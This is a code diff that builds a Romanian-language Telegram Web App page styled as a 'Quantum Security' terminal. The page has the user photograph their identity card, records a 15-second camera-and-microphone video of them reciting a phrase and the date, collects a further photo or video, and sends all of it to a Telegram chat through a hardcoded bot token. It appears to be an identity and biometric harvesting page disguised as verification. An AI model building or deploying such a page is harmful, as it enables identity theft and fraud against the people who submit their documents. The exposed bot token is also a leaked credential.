@@ -1,4 +1,73 @@
-    // VIDEO BIOMETRIC (Actualizat cu timer 15s)
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MostWanted Quantum Security</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --bg-pure: #000000; --terminal-green: #00FF66; --green-glow: rgba(0, 255, 102, 0.2); --panel-bg: #09090b; --text-white: #FFFFFF; --text-dark: #000000; --border-toxic: #00FF66; }
+        body { background-color: var(--bg-pure); color: var(--text-white); font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; overflow: hidden; }
+        body::after { content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 99999; background-size: 100% 3px, 6px 100%; pointer-events: none; }
+        .terminal-box { width: 100%; max-width: 360px; background-color: var(--panel-bg); border: 2px solid var(--border-toxic); padding: 25px 20px; box-shadow: 0 0 20px var(--green-glow); }
+        .step { display: none; } .step.active { display: block; }
+        .viewport { width: 100%; height: 210px; background: #020202; border: 1px solid rgba(0, 255, 102, 0.3); margin-bottom: 25px; position: relative; display: flex; align-items: center; justify-content: center; }
+        video, img { width: 100%; height: 100%; object-fit: cover; }
+        .action-btn { background: var(--terminal-green); color: var(--text-dark); border: none; padding: 16px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; box-shadow: 4px 4px 0px #006622; }
+        .console-text { font-size: 13px; color: #d1d1d6; margin-bottom: 25px; }
+        .terminal-loader { display: none; color: var(--terminal-green); margin: 15px 0; }
+        .recording-pulse { background: #FF3B30 !important; color: white !important; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.8; } }
+    </style>
+</head>
+<body>
+
+<div class="terminal-box">
+    <div id="step1" class="step active">
+        <div class="console-text">> SYSTEM_REQ: Încărcați scanarea frontală a actului.</div>
+        <div class="viewport"><img id="idPreview" style="display:none;"></div>
+        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
+        <button class="action-btn" onclick="document.getElementById('idInput').click()">[ CAPTURE_PHOTO ]</button>
+        <button class="action-btn" id="nextStepBtn" style="display: none; margin-top:10px" onclick="goToStep2()">NEXT_STAGE >></button>
+    </div>
+
+    <div id="step2" class="step">
+        <div class="console-text">> Rostiți: "MostWanted NETWORK, <span id="dataText"></span>"</div>
+        <div class="viewport"><video id="videoPreview" autoplay muted playsinline></video></div>
+        <button class="action-btn" id="recordBtn" onclick="toggleRecording()">[ START_RECORD ]</button>
+        <div id="logText">LOG: Așteptare...</div>
+    </div>
+
+    <div id="step3" class="step">
+        <div class="console-text">> SYSTEM_REQ: Încărcați dovada (Foto/Video).</div>
+        <input type="file" id="proofInput" accept="image/*,video/*" style="display: none;">
+        <button class="action-btn" onclick="document.getElementById('proofInput').click()">[ UPLOAD_PROOFS ]</button>
+        <div class="terminal-loader" id="loadingSpinner" style="display:block;">> Așteptare document...</div>
+    </div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp; tg.expand();
+    document.getElementById('dataText').innerText = new Date().toLocaleDateString('ro-RO');
+
+    const BOT_TOKEN = "8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk";
+    const CHAT_ID = "-1003936586656";
+    let idBlob, proofBlob, stream, mediaRecorder, recordedChunks = [];
+
+    document.getElementById('idInput').onchange = (e) => {
+        idBlob = e.target.files[0];
+        const reader = new FileReader();
+        reader.onload = (ev) => { document.getElementById('idPreview').src = ev.target.result; document.getElementById('idPreview').style.display = 'block'; document.getElementById('nextStepBtn').style.display = 'block'; };
+        reader.readAsDataURL(idBlob);
+    };
+
+    async function goToStep2() {
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById('videoPreview').srcObject = stream;
+    }
+
     function toggleRecording() {
         if (!mediaRecorder || mediaRecorder.state === "inactive") {
             recordedChunks = [];
@@ -12,13 +81,30 @@
             document.getElementById('recordBtn').innerText = "[ ÎNREGISTRARE ACTIVĂ ]";
             document.getElementById('recordBtn').classList.add('recording-pulse');
 
-            // Timer fix de 15 secunde
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(t => t.stop());
                 }
             }, 15000);
-
         }
     }
+
+    document.getElementById('proofInput').onchange = async (e) => {
+        proofBlob = e.target.files[0];
+        document.getElementById('loadingSpinner').innerText = "> SE TRIMITE...";
+        
+        let files = [ {t:"photo", f:idBlob, n:"buletin.jpg"}, {t:"video", f:new Blob(recordedChunks), n:"biometrie.webm"}, {t:proofBlob.type.includes('image')?"photo":"video", f:proofBlob, n:"dovada."+(proofBlob.type.includes('image')?'jpg':'webm')} ];
+        
+        for(let item of files) {
+            let fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append(item.t, item.f, item.n);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send` + (item.t=="photo"?"Photo":"Video"), {method:"POST", body:fd});
+        }
+        alert("Sesiune încheiată.");
+        tg.close();
+    };
+</script>
+</body>
+</html>
